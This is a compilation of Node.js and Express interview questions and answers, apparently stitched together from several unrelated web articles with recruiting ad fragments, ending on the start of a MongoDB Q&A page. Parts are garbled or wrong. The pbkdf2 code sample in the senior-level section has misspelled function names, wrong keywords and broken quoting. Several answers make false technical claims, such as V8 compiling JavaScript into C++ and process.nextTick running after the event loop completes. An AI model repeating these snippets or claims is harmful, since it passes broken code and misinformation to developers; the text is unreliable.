Front-end development includes every aspect that directly impacts the interactions of users with the web app. Back-end development focuses on web server-related processing. The processes in the back end communicate with a database to serve incoming requests.
Developers use technologies like JavaScript, HTML, CSS, Angular.JS, and React.JS for front-end development. Programmers use technologies like Java, Python, PHP, and Node.js for back-end development.
Question 12: Mention the various timing features offered by Node.js.

Answer: Node.js offers a “timers” module, and this contains different functions to execute a piece of code after a specified period of time. The following are a few examples of functions provided by this module:

“setTimeout”/”clearTimeout”: This adds delays in code execution and will execute a piece of code after a specified number of milliseconds.
“setInterval”/”clearInterval”: This executes a piece of code multiple times.
“setImmediate”/”clearImmediate”: This executes a piece of code at the end of the current event loop cycle.
“process.nextTick”: This schedules a callback function that will be invoked in the next iteration of the “event loop”.
Question 13: Explain “const” in Node.js.

Answer: A “const” in Node.js is a variable declared with the keyword “const”. Such variables store constant values. Programmers can’t update a “const”, furthermore, they can’t declare it again.

Question 14: What does the “utf8” module in Node.js do?

Answer: The “utf8” module in Node.js can encode or decode a string. Node.js developers can install it from NPM. This module encodes any JavaScript string as UTF-8. It then returns the UTF-8-encoded version of the string. The “utf8” module can decode any UTF-8 encoded string too.

Question 15: Does Node.js support scripting?

Answer: Node.js is a runtime environment for applications written in JavaScript. It’s not a full-fledged scripting language like Python. However, Node.js uses JavaScript as its scripting language. Various tutorials show how to use the scripting capabilities of JavaScript when developing a Node.js application.

Question 16: Provide examples of popular development tools in the Node.js ecosystem.

Answer: Node.js has a large and growing ecosystem. Many developers have created open-source development tools and frameworks for Node.js. A few examples of such development tools are as follows:

Webpack;
PM2;
Snyk;
Keystone.
Hire expert developers for your next project
137
Expert dev teams,
1,200 top developers
400+
Businesses trusted
us since 2016
Question 17: What does the “EventEmitter Object” in Node.js do?

Answer: The Node.js core API is built around an asynchronous event-driven programming architecture. This architecture has objects called “emitters” that emit named events. These cause “function” objects to be called.

All objects that emit events are parts of the “EventEmitter” class. “EventEmitter objects” emit events, and all of the functions attached to that event are called synchronously.

Question 18: Mention the various kinds of streams in Node.js.

Answer: In Node.js, streams are objects that allow programs to read or write data continuously. These are of the following kinds:

Readable streams;
Writeable streams;
“Duplex” streams, which can be used for both reading and writing operations;
“Transform” streams, which are “duplex” streams with the output that is computed.
Question 19: What are the various authentication options in Node.js?

Answer: Node.js developers have 3 options to implement authentication in Node.js applications. These are as follows:

Building your own authentication mechanism: It’s a very popular option, and this involves building an entire authentication system. Naturally, this is complex.
Using Passport.js: Passport.js is a middleware for Node.js, and it’s an authentication framework. It offers flexibility, however, implementing it in a Node.js app requires some effort.
Delegating authentication to a 3 rd party provider: This option offloads the authentication workloads to a 3 rd party provider, therefore, it doesn’t require much custom development.
Question 20: Explain “error-first callback” in Node.js.

Answer: Node.js developers use “error-first callbacks” to pass errors and data. They need to first pass an “error object” as a parameter to these functions. The other parameters represent the data associated with the object. Programmers can pass “error objects” to “error-first callbacks” to check for errors and to handle them.

Question 21: How to extract the filename from a file path in Node.js?

Answer: Node.js offers a method called “path.basename()”. Developers can use this to extract the filename from a Node JS file path.

Node.js Interview questions and answers for hiring mid-level developers
If you need to hire mid-level Node.js developers, then use the following Node JS interview questions:

Question 22: Explain the process to implement the “test pyramid” concept in terms of HTTP APIs.

Answer: Mick Cohn had developed the concept of a “test pyramid”. It prescribes a higher number of low-level unit tests than high-level end-to-end tests executed through a GUI. When using HTTP module APIs, one can define them as follows:

A high number of low-level unit tests for each model;
Fewer integration tests to validate the model interactions;
Even fewer acceptance testing to test the HTTP endpoints.
Question 23: How do the asynchronous and non-blocking APIs in Node.js work?

Answer: All Node.js library APIs support asynchronous processing. Therefore, all of them have non-blocking processing.

Node.js-based servers don’t wait for an API to return data. It calls an API and allows it to work. Meanwhile, it moves to the next API. Node.js has a notification mechanism, that responds to the server for the earlier API call.

Question 24: What does an “event loop” do in Node.js?

Answer: A Node.js event loop handles asynchronous “callbacks”. Non-blocking input or output operations are founded on the concept of event loops.

Node.js is based on JavaScript, which is single-threaded. This would prevent non-blocking input/output (I/O) operations. The event loop in Node.js offloads operations to the system kernel whenever it can.

Modern kernels are multi-threaded. They handle multiple operations in the background. After the completion of one operation, the kernel notifies Node.js. This allows Node.js to add the appropriate “callback” to the queue. In turn, this enables non-blocking I/O operations.

Question 25: Explain the advantages of the Express.js framework.

Answer: Express.js is a popular open-source framework based on Node.js. It offers the following advantages:

Developers can develop Node.js applications quickly and easily by using Express.js.
Programmers can easily configure and customize Express.js.
Express.js allows developers to define the routes of their applications based on HTTP methods and URLs.
This open-source framework includes different middleware modules that perform additional tasks.
Developers can easily integrate Express.js with different template engines.
Express.js enables programmers to define error-handling middleware.
Programmers can easily connect Express.js with databases like MongoDB, MySQL, Redis, etc.
Developers can easily create REST API servers with Express.js.
Question 26: What does the “package.JSON” file do in Node.js?

Answer: The “package.JSON” file is important for the functioning of Node.js. It’s the manifest file in a Node.js project, which has the metadata of the project. This file is in the root directory of a Node.js application.

The “package.JSON” contains two types of information, which are as follows:

“Identifying metadata properties”: These have the properties to identify the module or project. An example is the name of the project.
“Functional metadata properties”: These have the functional values or properties of the project or module. Dependencies in the project are examples of such information.
Question 27: Explain the differences between “readfile” and “createReadStream” in Node.js.

Answer: Node.js offers two different ways to read and execute files. These options are called “readfile” and “createReadStream”.

The “readfile()” process is a fully buffered process. This process can return a response only after the file is pushed into the buffer completely, moreover, the process must read the file fully. The “readfile()” process requires a lot of memory. This process can take time too.

The “createReadStream” process is a partially-buffered process, and that’s the main difference from the “readfile()” process. When executing the “createReadStream” process, Node.js splits a file into chunks. It processes these chunks one by one and sends responses accordingly. Node.js removes the chunks from the buffer after processing them. The “createReadStream” process makes it easier to process large files. The buffer class is used as pure JavaScript is not compatible with binary data.

Question 28: Explain the differences between “process.nextTick()” and “setImmediate()”.

Answer: Node.js offers several functions of the “Timers” module, and “process.nextTick()” and “setImmediate()” are examples. These functions help to execute a piece of code after a predefined period of time.

The “process.nextTick()” function waits for the execution of an action. It waits till the next pass in the event loop. This process invokes the callback function only after the event loop completes.

However, the “setImmediate()” function executes a callback method on the next cycle of the event loop. The control returns to the event loop to execute the I/O operations.

Question 29: Should you use synchronous functions in Node.js?

Answer: Node.js offers several synchronous functions, e.g., “statSync”, “readFileSync”, etc. However, synchronous functions often slow down Node.js applications. Furthermore, all synchronous functions in Node.js have corresponding asynchronous functions as alternatives. These alternatives often use a callback. In summary, there’s no real need to use synchronous functions in Node.js, furthermore, they can slow down an app.

Question 30: What are the two values that “async.queue” takes as inputs?

Hire expert developers for your next project
Trusted by
Answer: “Async.queue” helps to run a set of tasks asynchronously. It accepts the following two arguments:

Task function;
Concurrency value.
Question 31: Explain the use of the “node_modules” folder in Node.js.

Answer: The “node_modules” folder is similar to a cache for the external modules that a Node.js project depends on. Programmers can use the “npm install” option to download these modules from the web. This copies the modules into the “node_modules” folder, and Node.js looks at this folder for these modules.

Question 32: How does a URL module work in Node.js?

Answer:  A URL module helps to parse URLs and splits the web address into host, pathname, search, query, etc.

Question 33: What are the different exit codes in Node.js?

Answer: Various exit codes in Node.js include Internal JavaScript Evaluation Failure, Fatal Error Internal Exception hander, Runtime failure, etc.

Advanced Node JS interview questions to hire senior developers
Hiring senior Node.js developers? Use the following Node.js interview questions:

Question 34: Explain the importance of “Libuv” in Node.js.

Answer: “Libuv” is a C library. It’s an important dependency in Node.js. Node.js uses this library to abstract non-blocking I/O operations by providing a consistent interface across all of the supported platforms.

“Libuv” provides mechanisms to handle the following:

File system;
DNS;
Network;
“Child processes”;
“Pipes”;
Signal handling;
Polling;
Streaming.
“Libuv” provides asynchronous TCP and UDP sockets. Additionally, “Libuv” provides a thread pool. This thread pool allows Node.js applications to offload the kind of workloads that can’t be executed asynchronously at the level of the operating system (OS).

Question 35: Is there any exception to the single-threaded nature of Node.js?

Answer: Node.js is based on JavaScript, and it’s single-threaded. The main thread of Node.js is always single-threaded. This single thread of Node.js executes all the code written by a programmer. Better performance and scalability can be achieved by doing asynchronous programming with typical web loads on a single thread than the typical thread-based implementation.

However, Node.js isn’t based on JavaScript alone. This runtime environment is implemented on the V8 engine that’s used in Google Chrome. Node.js is also implemented on top of “Libuv”, a C library.

The V8 JavaScript engine compiles JavaScript code into C++. Furthermore, Node.js utilizes “Libuv” when accessing native modules like “fs” and “crypto”. Through “Libuv”, Node.js gets access to the multi-threading capabilities of the underlying operating system.

An example of multi-threading in Node.js is in the following code snippet where the “crypto” module is used. Note that this code snippet uses the hashing capabilities, and it uses the “pbkdf2” function from the “crypto” module.


Copy
<i>Const { pbkdfs } = require(‘crypto’);</i>
<i>Const start = Date.now();</i>
<i>Const doExpensiveHashing = () => {</i>
<i>Pbkfd2(‘pwd’, ‘salt’, 100000, 512, ‘sha512’, () =></i>
<i>Console.log(‘Done in ${Date.now() – start}ms’)>;</i>
<i>);</i>
<i>};</i>
<i>doExpensiveHashing(); // done in 938ms
</i>
The command require is used to import external libraries in Node.js

Question 36: Explain how to parse HTML in Node.js.

Answer: Node.js offers multiple open-source packages to parse HTML, and these are available on NPM. The following are two examples:

“Fast HTML Parser”: This HTML parser parses HTML quickly. It creates a single “Document Object Model” (DOM) tree, furthermore, it provides basic elementary query support.
“cheerio”: This Node.js parser for HTML helps developers scrape and parse data from web pages.
Question 37: Explain “REPL” in Node.js.

Answer: “REPL” in Node.js is an acronym for “Read Eval Print Loop”. “REPL” is an interactive shell. Programmers can use it to process Node.js expressions. Users enter JavaScript code, and “REPL” reads it. It interprets the code. “REPL” then evaluates (“EVAL”) the result of the code, and it prints the result.

It continues this process until the user ends this process. REPL is bundled with every Node.js installation, and a user doesn’t need to store it in a file separately.

Question 38: What are “stubs” in Node.js?

Answer: “Stubs” in Node.js are small program routines. They substitute for bigger programs that can be loaded later. Stubs can substitute for bigger programs that can be loaded remotely too. In Node.js, “stubs” have the following characteristics:

They can be anonymous.
Programmers can wrap stubs into existing functions. If a developer wraps a stub into an existing function, then the original function isn’t called.
Stubs affect the behavior of components or modules.
For testing, stubs act as dummy objects.
Stubs can implement pre-programmer responses.
Question 39: Explain the key differences between Node.js and AngularJS.

Answer: The main differences between Node.js and Angular.js are as follows:

Node.js is a runtime environment for JavaScript applications, however, Angular.js is an open-source web application framework to develop web applications.
You need to install Node.js on your computer to work on it as a JavaScript library. However, to work on Angular.JS, you only need to install an AngularJS file.
Developers use Node.js to build performant and scalable server-side networking applications. On the other hand, they use Angular.JS to build single-page client-side web apps.
Question 40: How does Node.js differ from Ajax?

Answer: The key differences between Node.js and Ajax concern their utility functions. Node.js helps with server-side development, whereas, Ajax facilitates client-side development. Programmers use Ajax to update or modify the contents of a webpage without a need to refresh the webpage. However, developers use Node.js to create the programs used by the server. They don’t use Node.js to create software for web browsers.

Question 41: What is a “control flow function” in Node.js?

Answer: A “control flow function” in Node.js is a piece of code that executes between several asynchronous function calls. Control flow functions control the order of execution, collect data, limit concurrency, call the next step in the program, etc. Node.js offers several standard control flow constructs, e.g.:

“if/else”;
“for”;
“while”;
“try/catch”;
“throw”.
Question 42: Which metrics should one track for monitoring the performance of a Node.js application?

Answer: One should track the following metrics to monitor the performance of a Node.js application:

CPU usage;
Heap usage, memory leaks, and garbage collection;
Lag in the Node.js event loop.	

Your Ultimate Guide to Node.js Interview Success
Introduction to Node.js with Express
Node.js is a runtime environment that allows you to run JavaScript on the server side. Built on Chrome's V8 JavaScript engine, Node.js is designed for building scalable network applications. Express.js is a minimal and flexible Node.js web application framework that provides a robust set of features for web and mobile applications. It simplifies routing, middleware management, and request handling, making it a go-to choice for developers working on server-side applications.

Table of Contents
Junior-Level Node.js Interview Questions
Mid-Level Node.js Interview Questions
Expert-Level Node.js Interview Questions
Proven Strategies and Best Practices for Node.js Interview

Junior-Level Node.js Interview Questions
Here are some junior-level interview questions for Node.js with Express:

Question 01: What is Node.js, and how does it work?

Answer: Node.js is a JavaScript runtime environment that allows you to run JavaScript on the server side. It uses the V8 engine for executing code and features a non-blocking, event-driven architecture for handling I/O operations efficiently.

Node.js processes tasks through a single-threaded event loop, managing multiple operations concurrently. This design is ideal for scalable network applications.

const http = require('http');
const server = http.createServer((req, res) => {
  res.end('Hello World');
});
server.listen(3000);
Question 02: Explain the role of the 'package.json' file in a Node.js project.

Answer: The package.json file in a Node.js project manages project metadata, dependencies, and scripts. It specifies the project's name, version, and author, and lists dependencies needed for the project.

It also defines custom scripts for tasks like testing or starting the application, which can be run with npm run. For example:

{
  "name": "my-node-app",
  "version": "1.0.0",
  "scripts": {
    "start": "node index.js",
    "test": "mocha"
  },
  "dependencies": {
    "express": "^4.17.1"
  }
}        
Question 03: What is Express.js and how does it relate to Node.js?

Answer: Express.js is a web framework for Node.js that simplifies building server-side applications. It provides tools for routing, middleware, and handling HTTP requests and responses.

Express.js builds on Node.js by offering a more user-friendly API for creating web servers and APIs.

const express = require('express');
const app = express();

app.get('/', (req, res) => res.send('Hello World'));
app.listen(3000);
In this example, Express.js creates a server that responds with "Hello World" to requests at the root URL.
Question 04: How do you install Express.js in a Node.js project?

Answer: You can install Express.js using npm (Node Package Manager) with the following command:

npm install express        
Question 05: How do you define a route in Express.js?

Answer: In Express.js, routes are defined using methods that correspond to HTTP methods. For example:

app.get('/path', (req, res) => {
  res.send('GET request to the homepage');
});
        
app.get() handles GET requests to the specified path, while app.post(), app.put(), and app.delete() handle POST, PUT, and DELETE requests, respectively.
Question 06: What is middleware in Express.js? Provide an example.

Answer: Middleware functions in Express.js are functions that have access to the request object (req), the response object (res), and the next middleware function in the application's request-response cycle. Middleware can perform tasks such as executing code, modifying the request and response objects, ending the request-response cycle, and calling the next middleware function. For example:

const express = require('express');
const app = express();

app.use((req, res, next) => {
  console.log('Request URL:', req.originalUrl);
  next();
});

app.get('/', (req, res) => {
  res.send('Hello World!');
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});
Question 07: How can you handle POST requests in Express.js?

Answer: To handle POST requests in Express.js, you use the app.post() method and typically parse the incoming request body using middleware such as body-parser or the built-in express.json(). For example:

const express = require('express');
const app = express();
app.use(express.json());

app.post('/submit', (req, res) => {
  res.send(`Received data: ${JSON.stringify(req.body)}`);
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});
Question 08: What is npm, and how is it used in Node.js?

Answer: npm (Node Package Manager) is a package manager for JavaScript. It manages packages and dependencies for Node.js projects. npm commands like npm install are used to add packages, npm update updates them, and npm uninstall removes them. The package.json file lists project dependencies and scripts for development tasks.

Question 09: What will be the output of this Node.js code?

let obj = { a: 1, b: 2 };
delete obj.b;
console.log(obj);        
Answer: The result will be:

{ a: 1 }        
Question 10: How do you serve static files in an Express application?

Answer: To serve static files in an Express application, you use the built-in middleware express.static(). This middleware serves static assets such as HTML, CSS, JavaScript, and images from a specified directory. For example:

const express = require('express');
const app = express();
app.use(express.static('public'));

app.get('/', (req, res) => {
  res.send('Welcome to the homepage!');
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});


Mid-Level Node.js Interview Questions
Here are some mid-level interview questions for Node.js with Express:

Question 01: Explain the concept of middleware chaining in Express.js.

Answer: Middleware chaining in Express.js refers to the process of executing multiple middleware functions in sequence. Each middleware function performs specific tasks such as logging requests, handling authentication, or parsing request bodies. Middleware functions must call the next() function to pass control to the next middleware function in the chain. This approach allows for modular and maintainable code.

const express = require('express');
const app = express();

// Middleware function 1
app.use((req, res, next) => {
  console.log('Middleware 1');
  next(); // Passes control to the next middleware function
});

// Middleware function 2
app.use((req, res, next) => {
  console.log('Middleware 2');
  next(); // Passes control to the next middleware function
});

// Route handler
app.get('/', (req, res) => {
  res.send('Hello World!');
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
}); 
Question 02: How do you handle error middleware in Express.js?

Answer: Error-handling middleware in Express.js has four parameters: err, req, res, and next. This middleware catches and handles errors that occur in the application. It should be defined after all other middleware and route handlers. For example:

app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});
Question 03: What are some common HTTP methods, and how are they used in Express.js routes?

Answer: Common HTTP methods include GET, POST, PUT, DELETE, PATCH, and OPTIONS. In Express.js, these methods are used to define routes that handle specific types of requests:

app.get('/', (req, res) => res.send('GET request'));
app.post('/', (req, res) => res.send('POST request'));
app.put('/user', (req, res) => res.send('PUT request'));
app.delete('/user', (req, res) => res.send('DELETE request'));
        
Question 04: How do you manage environment variables in a Node.js application?

Answer: Environment variables in Node.js are managed using the .env file and the dotenv package. The .env file contains key-value pairs of environment-specific settings, which are loaded into process.env by calling dotenv.config().

require('dotenv').config();
const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
Question 05: How can you handle file uploads in an Express application?

Answer: File uploads in Express applications are managed using the multer middleware. It processes multipart/form-data, which is used for file uploads. For example:

const multer = require('multer');
const upload = multer({ dest: 'uploads/' });

app.post('/upload', upload.single('file'), (req, res) => {
  res.send('File uploaded successfully!');
});
Question 06: What is the purpose of the next function in Express middleware?

Answer: In Express.js, the next function is used to pass control from one middleware function to the next in the stack. By calling next(), you ensure that the request moves forward to the subsequent middleware or route handler, allowing you to chain multiple middleware functions for tasks like authentication, logging, or request parsing.

If next is not called, the request will hang and not proceed through the middleware chain, potentially causing the application to become unresponsive. It’s crucial for the flow of requests and responses in an Express application, ensuring that all intended middleware functions and route handlers are executed in sequence.

Question 07: What will be the output of the following Node.js code?

const x = [10, 20, 30];
const y = x.slice(1, 2);
console.log(y);

        
Answer: The output will be:

[20]    
Question 08: How do you implement session management in an Express application?

Answer: Session management in Express can be implemented using the express-session middleware. This middleware allows you to create and manage user sessions, storing session data on the server-side. For example:

const session = require('express-session');

app.use(session({
  secret: 'secret-key',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: true }
}));

app.get('/', (req, res) => {
  if (req.session.views) {
    req.session.views++;
    res.send(`Number of views: ${req.session.views}`);
  } else {
    req.session.views = 1;
    res.send('Welcome to the homepage!');
  }
});        
Question 09: What are some common security practices for Express applications?

Answer: Common security practices for Express applications include:

Use HTTPS: Encrypt data between the server and client.
Validate and Sanitize Inputs: Prevent XSS and SQL injection attacks.
Use Environment Variables: Store sensitive data securely.
Implement Rate Limiting: Protect against DDoS attacks.
Secure Cookies: Set httpOnly, secure, and sameSite attributes.
Use Security Headers: Implement security headers with helmet middleware.
Protect Against Common Vulnerabilities: Mitigate XSS, CSRF, and SQL injection.
Question 10: How can you optimize the performance of a Node.js (with Express) application?

Answer: To optimize the performance of a Node.js (with Express) application, you can implement techniques such as caching, using a load balancer, optimizing database queries, using compression middleware, minimizing middleware usage, and ensuring non-blocking code. Additionally, profiling and monitoring the application can help identify and address performance bottlenecks.



Expert-Level Node.js Interview Questions
Here are some expert-level interview questions for Node.js with Express:

Question 01: Explain the event loop in Node.js and how it handles asynchronous operations.

Answer: The event loop is a core concept in Node.js that allows it to handle asynchronous operations in a non-blocking manner. It is a single-threaded loop that continuously checks for events, processes them, and delegates I/O operations to the system's kernel whenever possible. The event loop has several phases, including timers, pending callbacks, idle, poll, check, and close callbacks.

When an asynchronous operation (such as I/O or timers) completes, its callback is placed in the event queue, and the event loop picks it up and executes it. This mechanism allows Node.js to handle many concurrent operations efficiently without blocking the execution of the program.

Question 02: How do you implement authentication and authorization in an Express application?

Answer: Answer: Authentication and authorization in an Express application can be implemented using middleware such as passport. passport provides various strategies for authentication, including local, OAuth, and JWT. You can set up routes to handle login, registration, and protected resources, using middleware to verify user credentials and permissions.

Question 03: What are streams in Node.js, and how do they improve performance?

Answer: Answer: Streams in Node.js are objects that allow you to read or write data in a continuous flow. They improve performance by processing data piece-by-piece (chunks), rather than loading the entire data into memory at once. Streams are useful for handling large files, network communications, and other data-intensive operations. For example:

const fs = require('fs');

// Reading a file using streams
const readableStream = fs.createReadStream('largefile.txt');
readableStream.on('data', (chunk) => {
  console.log(`Received ${chunk.length} bytes of data.`);
});

// Writing to a file using streams
const writableStream = fs.createWriteStream('output.txt');
writableStream.write('This is some data.\n');
writableStream.end('This is the end of the data.');

        
Question 04: How do you handle real-time communication in a Node.js application?

Answer: Real-time communication in a Node.js application is commonly handled using Socket.IO, a library that enables bidirectional and event-based communication between clients and servers. Socket.IO works on top of WebSockets, but it also provides fallbacks for older browsers that do not support WebSockets.

To implement real-time communication, you first need to install Socket.IO and set it up on both the server and client sides. The server establishes a WebSocket connection, listens for events from clients, and can emit events to clients. The client, typically a web browser, connects to the server and communicates through events as well.

Question 05: What is clustering in Node.js, and how does it help with scalability?

Answer: Clustering in Node.js allows you to create multiple instances (workers) of your application that can run on multiple CPU cores. This helps with scalability by distributing incoming requests across the workers, effectively utilizing the available CPU resources and improving the application's throughput. The cluster module in Node.js can be used to set up clustering.

Question 06: How do you use async/await in Node.js to handle asynchronous code?

Answer: async/await is a syntax in JavaScript that allows you to write asynchronous code in a synchronous manner. Functions declared with the async keyword return a promise, and the await keyword can be used to pause the execution of the async function until the promise is resolved. For example:

const fetch = require('node-fetch');

async function fetchData() {
  try {
    const response = await fetch('https://api.example.com/data');
    const data = await response.json();
    console.log(data);
  } catch (error) {
    console.error('Error fetching data:', error);
  }
}

fetchData();
Question 07: What are some advanced routing techniques in Express.js?

Answer: Advanced routing techniques in Express.js include using route parameters, query parameters, and nested routes. You can also use express.Router() to create modular and mountable route handlers. For example:

const express = require('express');
const router = express.Router();

router.get('/users/:userId',(req,res)=>{
const userId = req.params.userId;
res.send(`User ID: ${userId}`);
});

app.use('/api',router);
Question 08: How do you manage database connections in a Node.js (with Express) application?

Answer: Database connections in a Node.js (with Express) application can be managed using connection pooling and ORM libraries such as sequelize for SQL databases or mongoose for MongoDB. Connection pooling helps manage multiple database connections efficiently, reducing the overhead of establishing and closing connections repeatedly.

const mongoose = require('mongoose');

mongoose.connect('mongodb://localhost:27017/mydatabase', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

const db = mongoose.connection;
db.on('error', console.error.bind(console, 'connection error:'));
db.once('open', () => {
  console.log('Connected to the database');
});
Question 09: Explain the use of process management tools like PM2 in a Node.js application.

Answer: Process management tools like PM2 are essential for maintaining Node.js applications in production. PM2 ensures continuous operation by automatically restarting applications if they crash, minimizing downtime. It provides features for starting, stopping, and monitoring processes, as well as real-time performance tracking.

PM2 enhances scalability through load balancing and cluster mode, running multiple instances of an application to distribute traffic and fully utilize system resources. It also simplifies log management and can generate startup scripts to ensure applications start on system boot, making it a comprehensive tool for managing Node.js applications in production.

Question 10: What are some strategies for ensuring the security of a Node.js (with Express) application?

Answer: Strategies for ensuring the security of a Node.js (with Express) application include using HTTPS, validating and sanitizing user inputs, implementing authentication and authorization, protecting against common web vulnerabilities (XSS, CSRF, SQL injection), using security headers with helmet, managing environment variables securely, and keeping dependencies up to date. Additionally, performing regular security audits and code reviews can help identify and address potential security issues.



Ace Your Node.js Interview: Proven Strategies and Best Practices
To excel in a Node.js technical interview, it's crucial to have a strong grasp of the language's core concepts. This includes a deep understanding of syntax and semantics, data types, and control structures. Additionally, mastering Node.js approach to error handling is essential for writing robust and reliable code. Understanding concurrency and parallelism can set you apart, as these skills are highly valued in many programming languages.

Core Language Concepts: Syntax, semantics, data types (built-in and composite), control structures, and error handling.
Concurrency and Parallelism: Creating and managing threads, using communication mechanisms like channels and locks, and understanding synchronization primitives.
Standard Library and Packages: Familiarity with the language's standard library and commonly used packages, covering basic to advanced functionality.
Practical Experience: Building and contributing to projects, solving real-world problems, and showcasing hands-on experience with the language.
Testing and Debugging: Writing unit, integration, and performance tests, and using debugging tools and techniques specific to the language.
Practical experience is invaluable when preparing for a technical interview. Building and contributing to projects, whether personal, open-source, or professional, helps solidify your understanding and showcases your ability to apply theoretical knowledge to real-world problems. Additionally, demonstrating your ability to effectively test and debug your applications can highlight your commitment to code quality and robustness.

Top 24 Node.js Interview Questions with Answers for 1 to 2 Years Experienced Web Developers
Hello guys, if you are preparing for a JavaScript developer or web developer and looking for common Node.js questions to prepare for interviews then you are at right place. In the past, I have shared JavaScript interview questions, React Questions, Angular Questions and even web development questions and in this article, I am going to share frequently asked Node.js questions with answers for interviews.  Though Node.js is defined as a JavaScript environment, it is widely considered as a backend framework. Since its inception in 2008, Node.js has become a popular term in the server-side development community. More and more companies are using Node.js for backend development.

There are several reasons for choosing Node.js. It is comparatively easier to use because JavaScript is used in Node. Moreover, it uses an event-driven and asynchronous model that enhances the performance.

Today, Node.js has a huge job market. It is giving tough competition to other popular backend frameworks such as Spring Framework, while it is replacing older frameworks such as PHP. Moreover, it is believed that Node.js will dominate server-side development in the future. Node developers are paid very well too.

The average salary of a Node developer in the USA is 113K per year, which definitely makes learning Node.js worthy of your time and effort. Though, more often than note, learning Node.js will help you to become a better Java developer and also enhance your profile as fullstack JavaScript developer. 




20+ Node.js Interview Questions with Answers
Node.js interviews can be tough. So we have created a list of 20+ Node.js interview questions that will help you in clearing an interview. We have added the questions that are commonly asked in Node.js interviews.


1. Define Node.js?
A: Node.js is a backend JavaScript runtime environment. It is built on Google chrome's V8 engine. Using Node.js, we can execute JavaScript outside the browser, meaning on the server-side.


2. Why use Node.js over Java for backend development?
A: Basically, Node.js is a runtime environment that allows JavaScript to execute outside the browser. So, instead of using different languages on the client-side and server-side, we can use one language i.e. JavaScript on the client-side as well as server-side. The second reason is that JSON, which is most commonly used for data transmission, works perfectly with Node.js (JavaScript). Moreover, Node is faster than Java.


3. What are callback functions?
A: Callback functions are usually confusing. According to some developers, a callback function can be defined as a function that is passed as an argument to another function. The callback function is executed after the execution of the other function to which it is passed. Some developers often define a callback function as a function accessible by another function.



4. Define NPM?
A: NPM stands for Node Package Manager. It is a package manager that contains all the packages and modules related to Node.js. You can also see these NPM online courses to learn Node Package Manager better. 



5. Which database is best to use with Node and Why?
A: MongoDB is the best database to use with Node.js because it is a NoSQL database, and it can be used easily with Node with the help of mongoose. Moreover, MongoDB is highly scalable, high-performing, and is easy to maintain.



6. How to import external libraries in a Node.js file?
A: The "require" keyword is used to import external libraries in a Node file.



7. Is DOM accessible in Node? Justify your answer.
A: No, DOM is not accessible in Node because Node works on the server-side outside the browser.



8. What is callback hell and how to avoid it?
A: When callback functions are nested heavily, the code becomes unmaintainable and unreadable. This situation is called callback hell. It can be avoided by using promises or async/await in the place of callback functions.



9. What is middleware? What is the task of middleware?
A: A middleware is a function that has access to the request and response objects. It can execute any code, update the response and request objects, and invoke the next middleware. It can also end the execution cycle.



10. Explain how you will connect Node.js with MongoDB.
A: First, I will import the "mongodb" module using the "require" keyword. Then, using this module, I will create a MongoClient object, like the following:

let MC = require("mongodb").MongoClient;

Then, by using the IP address and database name, I will create the URI string. Finally, to connect with the MongoDB database, I will use the MongoClient object to invoke the connect() method. This method will take two arguments: URI and a callback function. If the callback function executes without any error, then the database is connected properly.



11. How to export a module in Node.js?
A: We can export a module in Nodejs using module.exports.




12. What is the best way to handle asynchronous requests in Node.js? Justify your answer.
A: Using async/await is the best of handling asynchronous in Node.js. While using callbacks is fine but using them extensively will lead to callback hells. Another option is promises but promise chains can also be complex and complicated. On the other hand, async/await is easy to use and it does not lead to anything complicated like callbacks and promises.



13. Which framework is generally used with Node.js to manage everything more neatly and properly?
A: Express.js is generally used with Node.js to manage and organize everything more neatly and properly.



14. Which tool is used to test the APIs developed in Node.js?
A: Postman is the most commonly used tool for testing APIs in Node.js.



15. Which middleware is used to handle HTTP requests in express?
A: Body-parser is used to handle HTTP requests in the express. It can be installed using NPM.



16. What is package.json?
A: The package.json file is created when a Node project is created using the npm init command. This file contains all the metadata regarding the project. It includes the details of the project, versions, dependencies, devDependencies, scripts, and more.



17. Explain streams. Also, give the types of streams in Node?
A: Objects that are used to read and write data continuously are called streams. There are four types of streams: Readable, Writable, Duplex, and Transform.


18. Explain event-driven programming?
A: It is a programming paradigm in which the application is built around the events, meaning, it is based on and responds to events.

Top 20 Node.js Interview Questions with Answers for 1 to 2 Years Experienced Web Developers




19. What is REPL?
A: REPL is a virtual environment of Node.js. It stands for Read-Eval-Print-Loop.


20. Explains Timers?
A: Timers are in-built Node.js functions that are used to execute a piece of code after a specific time. setTimeout() is an example of Timers in Node.


21. Name a commonly used authentication middleware in Node?
A: Passport.js is the commonly used authentication middleware in Node.


22. How can you distinguish Node.js from JavaScript?
A: Following are the difference between Node.js and JavaScript:

1. JavaScript is a programming language while Node.js is a programming environment that enables JavaScript to execute outside the browser.

2. JavaScript is used in client-side development while Node.js is used in server-side development.


23. Explain the working of Node.js?
A: Node.js runs on Google Chrome's V8 engine and uses a virtual machine. This virtual machine, in turn, uses JavaScript as the scripting language.


24. What kind of applications are built using Node.js?
A: Several kinds of applications can be built using Node.js. It is used heavily in building real-time web applications, especially on the server-side. Moreover, it is also used to build network apps, distributed systems, and general-purpose applications.


That's all about common Node.js interview questions with Answers for 1 to 2 years experienced we, developers. Node.js alone is not a huge topic for interviews. It is mostly combined with Express or MongoDB, or even with frontend technologies like React and Angular. In this article, we listed 20+ Node interview questions which include the combined question with express as well as MongoDB. To prepare without exception, also go through JavaScript because modern JavaScript features are often asked in Node.js interviews.

MangoDB Interview Questions

25 MongoDB Interview Questions and Answers (2023)
An overview of questions commonly asked in an interview for a position involving MongoDB, the popular open-source database system. Topics include database structure, scalability, performance, and security.
Apr 14, 2023 - 14:180
 Facebook  Twitter      
25 MongoDB Interview Questions and Answers (2023)25 MongoDB Interview Questions and Answers (2023)



What is MongoDB?
MongoDB is a popular NoSQL database management system that stores data in a flexible, JSON-like format called BSON. It is known for its high performance, scalability, and flexibility, making it ideal for handling large-scale, unstructured data.

What are the key features of MongoDB?
MongoDB has several key features, including:

Document-based storage: MongoDB stores data in flexible, JSON-like documents.
Scalability: MongoDB is horizontally scalable, allowing it to handle large amounts of data and high traffic loads.
High availability: MongoDB supports replica sets and automatic failover for ensuring high availability and data durability.
